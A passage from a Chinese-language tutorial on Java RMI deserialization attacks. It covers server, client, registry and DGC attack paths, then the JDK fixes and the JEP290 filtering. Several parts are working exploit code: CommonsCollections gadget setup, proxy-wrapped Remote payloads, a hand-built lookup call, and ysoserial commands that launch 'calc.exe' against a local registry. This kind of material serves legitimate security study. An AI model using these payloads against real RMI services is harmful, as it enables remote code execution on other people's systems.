            // 反射获取HashSet中map的值
            Field map = Class.forName("java.util.HashSet").getDeclaredField("map");
            // 取消访问限制检查
            map.setAccessible(true);
            // 获取HashSet中map的值
            HashMap hashSetMap = (HashMap) map.get(hashSet);
            // 反射获取 HashMap 中 table 的值
            Field table = Class.forName("java.util.HashMap").getDeclaredField("table");
            // 取消访问限制检查
            table.setAccessible(true);
            // 获取 HashMap 中 table 的值
            Object[] hashMapTable = (Object[]) table.get(hashSetMap);
            Object node = hashMapTable[0];
            if (node == null) {
                node = hashMapTable[1];
            }
            // 将 key 设为 tiedMapEntry
            Reflections.setFieldValue(node, "key", tme);
            return hashSet;
        }
    }
具体实现是hook InvokeRemoteMethod函数，强制更改了参数值。
#### 注册中心攻击服务端
这个与注册中攻击客户端一样，用处不大。
### 攻击客户端
#### 返回恶意数据
直接返回恶意数据，客户端会反序列化恶意数据，从而造成命令执行
#### 注册中心攻击客户端
注册中心也会返还数据给客户端，也是序列化的数据客户端也会反序列化。
利用ysoserial：`java -cp ysoserial.jar ysoserial.exploit.JRMPListener 1099
CommonsCollections6 "calc.exe"`
    import java.rmi.registry.LocateRegistry;
    import java.rmi.registry.Registry;
    public class RegistryToClient {
        public static void main(String[] args) throws Exception {
            Registry registry = LocateRegistry.getRegistry("127.0.0.1",1099);
            registry.unbind("http://127.0.0.1/Hello");
        }
    }
lookup、bind、unbind、rebind都能受到攻击。
### 攻击注册中心
bind，rebind，unbind，lookup都是一样的。不过unbind和lookup只能传输字符串，但我们可以利用反射等方法修改数据。
  1. bind函数会将一个对象绑定到注册中心，传输数据的过程是通过序列化的方式，然后注册中心会反序列化该对象，如果传递的是恶意对象，也能造成命令执行。
RMIserver
    import java.rmi.Naming;
    import java.rmi.registry.LocateRegistry;
    public class RMIServer {
        private void start() throws Exception {
            Service h = new Service();
            LocateRegistry.createRegistry(1091);
            Naming.bind("rmi://127.0.0.1:1091/Hello", h);
        }
        public static void main(String[] args) throws Exception {
            new RMIServer().start();
        }
    }
为什么使用Naming：Naming就是相当于registry的一个封装，这里不能直接使用createRegistry返回的对象的bind、rebind等等。可以使用`LocateRegistry.*getRegistry*();`这和Naming返回的对象都是RegistryImpl_Stub而不是createRegistry方法返回的RegistryImpl对象。具体的执行步骤可以看上面。
#### 直接利用ysoserial
ysoserial：`java -cp ysoserial.jar ysoserial.exploit.RMIRegistryExploit
127.0.0.1 1091 CommonsCollections1 "calc.exe"`
触发点在RegistryImpl_Skel.class，低版本这个文件并不能直接找到，需要在RegistryImpl.class的bind方法打断点然后看调用栈才能看见，使用rebind，unbind等等就在对应位置打断点。
case 0就是bind分支，其中的
    public void dispatch(Remote var1, RemoteCall var2, int var3, long var4) throws Exception {
            if (var4 != 4905912898345647071L) {
                throw new SkeletonMismatchException("interface hash mismatch");
            } else {
                RegistryImpl var6 = (RegistryImpl)var1;
                String var7;
                Remote var8;
                ObjectInput var10;
                ObjectInput var11;
                switch(var3) {
                case 0:
                    try {
                        var11 = var2.getInputStream();
                        var7 = (String)var11.readObject();
                        var8 = (Remote)var11.readObject();
                    } catch (IOException var94) {
                        throw new UnmarshalException("error unmarshalling arguments", var94);
                    } catch (ClassNotFoundException var95) {
                        throw new UnmarshalException("error unmarshalling arguments", var95);
                    } finally {
                        var2.releaseInputStream();
                    }
                    var6.bind(var7, var8);
                    try {
                        var2.getResultStream(true);
                        break;
                    } catch (IOException var93) {
                        throw new MarshalException("error marshalling return", var93);
                    }
                case 1:
                    var2.releaseInputStream();
                    String[] var97 = var6.list();
                    try {
                        ObjectOutput var98 = var2.getResultStream(true);
                        var98.writeObject(var97);
                        break;
                    } catch (IOException var92) {
                        throw new MarshalException("error marshalling return", var92);
                    }
                case 2:
                    try {
                        var10 = var2.getInputStream();
                        var7 = (String)var10.readObject();
                    } catch (IOException var89) {
                        throw new UnmarshalException("error unmarshalling arguments", var89);
                    } catch (ClassNotFoundException var90) {
                        throw new UnmarshalException("error unmarshalling arguments", var90);
                    } finally {
                        var2.releaseInputStream();
                    }
                    var8 = var6.lookup(var7);
                    try {
                        ObjectOutput var9 = var2.getResultStream(true);
                        var9.writeObject(var8);
                        break;
                    } catch (IOException var88) {
                        throw new MarshalException("error marshalling return", var88);
                    }
                case 3:
                    try {
                        var11 = var2.getInputStream();
                        var7 = (String)var11.readObject();
                        var8 = (Remote)var11.readObject();
                    } catch (IOException var85) {
                        throw new UnmarshalException("error unmarshalling arguments", var85);
                    } catch (ClassNotFoundException var86) {
                        throw new UnmarshalException("error unmarshalling arguments", var86);
                    } finally {
                        var2.releaseInputStream();
                    }
                    var6.rebind(var7, var8);
                    try {
                        var2.getResultStream(true);
                        break;
                    } catch (IOException var84) {
                        throw new MarshalException("error marshalling return", var84);
                    }
                case 4:
                    try {
                        var10 = var2.getInputStream();
                        var7 = (String)var10.readObject();
                    } catch (IOException var81) {
                        throw new UnmarshalException("error unmarshalling arguments", var81);
                    } catch (ClassNotFoundException var82) {
                        throw new UnmarshalException("error unmarshalling arguments", var82);
                    } finally {
                        var2.releaseInputStream();
                    }
                    var6.unbind(var7);
                    try {
                        var2.getResultStream(true);
                        break;
                    } catch (IOException var80) {
                        throw new MarshalException("error marshalling return", var80);
                    }
                default:
                    throw new UnmarshalException("invalid method number");
其种的String和Remote类型的参数都可以作为攻击手段，ysoserial就是利用的Remote参数，需要将恶意链包装为Remote参数，而Barmi就是利用的String参数，利用String参数就需要自己构建字节流
包装Remote可以利用动态代理或者自己实现接口
    public class ServerRegistry {
        public static Remote Payload() throws Exception {
            Object seri = CommonsCollections6TemplatesImpl("calc.exe");
            Class AnnotationInvocationHandlerClass = Class.forName("sun.reflect.annotation.AnnotationInvocationHandler");
            Constructor cons = AnnotationInvocationHandlerClass.getDeclaredConstructor(Class.class, Map.class);
            cons.setAccessible(true);
            InvocationHandler evalObject = (InvocationHandler) cons.newInstance(java.lang.annotation.Retention.class, seri);
            Remote proxyEvalObject = (Remote)Proxy.newProxyInstance(Remote.class.getClassLoader(), new Class[]{Remote.class}, evalObject);
            return proxyEvalObject;
        }
        public static void ServerRegistry() throws Exception {
            LocateRegistry.createRegistry(1099);
            Naming.bind("rmi://127.0.0.1/1099/Hello", Payload());
        }
        public static void main(String[] args) throws Exception {
            ServerRegistry();
        }
    }
利用Remote包装
    private static class BindExploit implements Remote, Serializable {
        private final Object memberValues;
        private BindExploit(Object payload) {
            memberValues = payload;
        }
    }
    Remote remote_lala = new BindExploit(payload);
#### 编写lookup攻击
由于lookup只接受String类型参数，所以需要我们模仿lookup传参过程。
    package org.payload.rmi.rmiRegistry;
    import sun.rmi.server.UnicastRef;
    import java.io.ObjectOutput;
    import java.lang.reflect.Constructor;
    import java.lang.reflect.Field;
    import java.lang.reflect.InvocationHandler;
    import java.lang.reflect.Proxy;
    import java.rmi.Remote;
    import java.rmi.registry.LocateRegistry;
    import java.rmi.registry.Registry;
    import java.rmi.server.Operation;
    import java.rmi.server.RemoteCall;
    import java.rmi.server.RemoteObject;
    import java.util.Map;
    import static org.payload.CC.CC6.CommonsCollections6TemplatesImpl.CommonsCollections6TemplatesImpl;
    public class ClientToRegistry {
        public static void main(String[] args) throws Exception {
            Class AnnotationInvocationHandlerClass = Class.forName("sun.reflect.annotation.AnnotationInvocationHandler");
            Constructor cons = AnnotationInvocationHandlerClass.getDeclaredConstructor(Class.class, Map.class);
            cons.setAccessible(true);
            Object seri = CommonsCollections6TemplatesImpl("calc.exe");
            InvocationHandler evalObject = (InvocationHandler) cons.newInstance(java.lang.annotation.Retention.class, seri);
            Remote proxyEvalObject = Remote.class.cast(Proxy.newProxyInstance(Remote.class.getClassLoader(), new Class[]{Remote.class}, evalObject));
            //LocateRegistry.createRegistry(1091);
            Registry registry_remote = LocateRegistry.getRegistry("127.0.0.1", 1091);
            // 获取super.ref
            Field[] fields_0 = registry_remote.getClass().getSuperclass().getSuperclass().getDeclaredFields();
            fields_0[0].setAccessible(true);
            UnicastRef ref = (UnicastRef) fields_0[0].get(registry_remote);
            // 获取operations
            Field[] fields_1 = registry_remote.getClass().getDeclaredFields();
            fields_1[0].setAccessible(true);
            Operation[] operations = (Operation[]) fields_1[0].get(registry_remote);
            // 跟lookup方法一样的传值过程
            RemoteCall var2 = ref.newCall((RemoteObject) registry_remote, operations, 2, 4905912898345647071L);
            ObjectOutput var3 = var2.getOutputStream();
            var3.writeObject(proxyEvalObject);
            ref.invoke(var2);
        }
    }
#### 利用报错带出回显
攻击注册中心时，注册中心会直接把异常返还给客户端。
### 利用DGC攻击
#### DGC
分布式垃圾收集机制，在java中如果一个对象没有被任何变量引用那么就可以被垃圾回收机制回收，对于远程对象，不仅会在本地引用，Registry注册表也会持有引用。当客户端获取一个远程对象时，就会向DGC发送一个租赁消息。因此可以利用与DGC的通信进行反序列化漏洞
与RMI通信不同的是，通过UnicastServerRef#OldDispatch进入DGCImpl_Skel#dispatch。通过case分支执行dirty（租赁、续租）或者clean（清除），然后执行到对应的readObject。
    case 1:
                    Lease var10;
                    try {
                        ObjectInput var11 = var2.getInputStream();
                        var7 = (ObjID[])((ObjID[])var11.readObject());
                        var8 = var11.readLong();
                        var10 = (Lease)var11.readObject();
                    } catch (IOException var32) {
                        throw new UnmarshalException("error unmarshalling arguments", var32);
                    } catch (ClassNotFoundException var33) {
                        throw new UnmarshalException("error unmarshalling arguments", var33);
                    } finally {
                        var2.releaseInputStream();
                    }
                    Lease var40 = var6.dirty(var7, var8, var10);
#### 8u121以前
这里的readObject也是我们可以利用的，直接打注册端。
ysoserial:`java -cp ysoserial.jar ysoserial.exploit.JRMPClient 127.0.0.1 1091
CommonsCollections5 "calc.exe"`
## 一些修复
  1. 在低版本的JDK中，注册中心和服务端可以不在一个服务器上，但是在8u121之后，在bind方法里面增加了一个checkAccess方法，检查是否为localhost，但是反序列化在bind之前就执行了，并没有什么用，然后在8u141修改为在RegistryImpl_Skel中执行readObject之前就执行了了checkAccess方法，这样bind，rebind，unbind就没有用了。
  2. JEP290之后攻击注册端执行readObject时，会有filter过滤，只允许一些白名单类通过。
# JEP290
  1. 实现了一个限制反序列化的机制，通过白名单或者黑名单。
  2. 现在反序列化深度和复杂度
  3. 为远程RMI调用讴歌对象提供验证机制
  4. 拥有可配置的过滤机制
适用范围
8u121，7u131，6u141及其之后版本
白名单
    String  Number  Remote  Proxy  UnicastRef  RMIClientSocketFactory  RMIServerSocketFactory  ActivationID  UID
实现方法
提供了一个ObjectInputFilter接口，通过设置filter对象在反序列化（ObjectInputStream#readObject）时触发filter检测。
在JEP290之后只有server和client直接传输恶意数据可以利用，而其他攻击方法都失效了，会显示REJECTED。
我们代理的Remote对象也不能通过，虽然是Remote类型，但是在反序列化时会对其内部字段也进行反序列化，内部白名单外的类都会被检查，外层的Remote虽然过了检查，但是其他恶意类也无法通过，也会被拦截。
## 实现过程
在ObjectInputStream中
readObject->readObject0->readOrdinaryObject->readClassDesc->readProxyDesc或者
readNonProxyDesc->filterCheck
### RMI中实现过程
RegistryImpl_Skel#dispatch中执行readObject，然后一步步执行到过滤器这里，可以看见Remote动态代理是成功通过检查的，但是后面的`AnnotationInvocationHandler`就被拦截了。
但是这里的filter为什么是registryFilter？
在RegistryImpl中，`RegistryImpl::registryFilter`作为一个Lambda表达式，相当于`info->RegistryImpl.registryFilter(info)`
    public RegistryImpl(int port,
                            RMIClientSocketFactory csf,
                            RMIServerSocketFactory ssf)